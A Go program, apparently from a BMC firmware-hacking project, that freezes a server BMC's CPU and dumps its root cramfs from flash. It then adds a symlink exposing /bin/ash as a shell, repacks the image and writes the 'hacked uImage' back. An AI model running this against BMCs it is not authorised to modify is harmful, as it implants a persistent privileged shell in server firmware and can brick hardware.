package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"

	"github.com/dhtech/leopatch/ast"
)

type partition struct {

}

func main() {
	a := ast.NewAst()
	defer a.Close()

	fmt.Printf(" [*] BMC is %v\n", a.ModelName())

	// Changing the flash and then resuming is not safe, and most likely
	// the user wants to reset to load the new flash anyway
	defer a.ResetCpu()

	a.FreezeCpu()
	fmt.Printf(" [*] CPU now frozen\n")
	defer a.UnfreezeCpu()

	f, err := a.SystemFlash()
	if err != nil {
		log.Fatalf("Unable to acquire flash: %v", err)
	}
	defer f.Close()
	fmt.Printf(" [*] Acquired system flash\n")
	fmt.Printf(" [>] Chip ID: %06x\n", f.Id())

	loc, size := scan(f)
	if _, err := os.Stat("/tmp/root.bin"); os.IsNotExist(err) {
		// 0x40 = the uImage header
		dump(f, loc + 0x40, size - 0x40, "/tmp/root.bin")
		fmt.Printf(" [*] Root dumped\n")
	} else {
		fmt.Printf(" [*] Previous root dump found, using it\n")
	}

	_ = os.RemoveAll("/tmp/bmc-root")

	fmt.Printf(" [*] Extracting root\n")
	c := exec.Command("/usr/sbin/cramfsck", "-x", "/tmp/bmc-root", "/tmp/root.bin")
	if err := c.Run(); err != nil {
		log.Fatalf("Failed to extract root: %v", err)
	}

	fmt.Printf(" [*] Modifying root\n")
	if err := os.Symlink("/bin/ash", "/tmp/bmc-root/usr/local/bin/smash"); err != nil {
		log.Fatalf("Failed to create shell symlink: %v", err)
	}

	fmt.Printf(" [*] Compressing root\n")
	c = exec.Command("/usr/sbin/mkcramfs", "/tmp/bmc-root", "/tmp/root-new.bin")
	if err := c.Run(); err != nil {
		log.Fatalf("Failed to create new root: %v", err)
	}

	fmt.Printf(" [*] Creating uImage\n")
	c = exec.Command(
		"/usr/bin/mkimage", "-A", "arm", "-O", "linux", "-T", "ramdisk",
		"-C", "none", "-d", "/tmp/root-new.bin", "/tmp/root-image.bin")
	if err := c.Run(); err != nil {
		log.Fatalf("Failed to create new root: %v", err)
	}

	fmt.Printf(" [*] Writing hacked uImage\n")
	write(f, loc, "/tmp/root-image.bin")

	fmt.Printf(" [*] All done, have a nice day\n")
}

func write(f ast.Flash, loc int64, fp string) {
	buf := make([]byte, 64*1024)

	df, err := os.Open(fp)
	if err != nil {
		log.Fatalf("Failed to open file: %v", err)
	}
	defer df.Close()
	size, err := df.Seek(0, 2)
	if err != nil {
		log.Fatalf("Failed to seek to end of data file: %v", err)
	}
  _, err = df.Seek(0, 0)
	if err != nil {
		log.Fatalf("Failed to seek to start of data file: %v", err)
	}
	all := size
	fmt.Printf(" [*] Write progress: 0%%")
	for {
		n, err := df.Read(buf)
		if err != nil {
			log.Fatalf("Failed to read: %v", err)
		}
		fmt.Printf("\r [*] Write progress: %d%%", 100 - (size * 100 / all))
		loc += int64(len(buf))
		if size <= int64(n) {
			_, err = f.WriteAt(buf[:size], loc)
			break
		} else {
			_, err = f.WriteAt(buf[:n], loc)
		}
		if err != nil {
			log.Fatalf("Failed to write: %v", err)
		}
		size -= int64(n)
	}
	fmt.Printf("\r [*] Write complete\n")
}

func dump(f ast.Flash, loc int64, size int, fp string) {
	buf := make([]byte, 64*1024)

	df, err := os.OpenFile(fp, os.O_RDWR | os.O_CREATE, 0700)
	if err != nil {
		log.Fatalf("Failed to open dump file: %v", err)
	}
	defer df.Close()
	all := size
	fmt.Printf(" [*] Read progress: 0%%")
	for {
		n, err := f.ReadAt(buf, loc)
		if err != nil {
			log.Fatalf("Failed to dump: %v", err)
		}
		fmt.Printf("\r [*] Read progress: %d%%", 100 - (size * 100 / all))
		loc += int64(len(buf))
		if size <= n {
			df.Write(buf[:size])
			break
		} else {
			df.Write(buf[:n])
		}
		size -= n
	}
	fmt.Printf("\r [*] Read complete\n")
}

func scan(f ast.Flash) (int64, int) {
	offset := int64(0x0)

	block := int64(64*1024)
	size := block
	b := make([]byte, size)
	for {
		if offset > 32*1024*1024 {
			break
		}
		n, err := f.ReadAt(b[:size], offset)
		if err != nil {
			log.Fatalf("Read failed: %v", err)
		}

		v := strings.Index(string(b[:n]), "$MODULE$")
		if v == 0 {
			if b[62] == 0xaa && b[63] == 0x55 {
				ssize := int(b[15]) << 24 + int(b[14]) << 16 + int(b[13]) << 8 + int(b[12])
				name := b[24:32]
				fmt.Printf(" [>>] Partition %v @ %x \n", string(name), offset)
				if string(name[:4]) == "root" {
					fmt.Printf(" [*] Found the root, size is %d MiB\n", ssize / 1024 / 1024)
					// TODO(bluecmd): Offset seems to be 1 erase block.
					// If this breaks, look at scanning for cramfs / uImage.
					return offset + 0x10000, ssize - 0x10000
				}
				offset = (offset + int64(ssize)) & 0xffff0000
				continue
			}
		} else if v > -1 {
			// Align to be able to read full header
			size = 128
			offset += int64(v)
			continue
		}

		offset += size
		size = block
	}

	log.Fatal(" [!!] No root partition found")
	return 0, 0
}
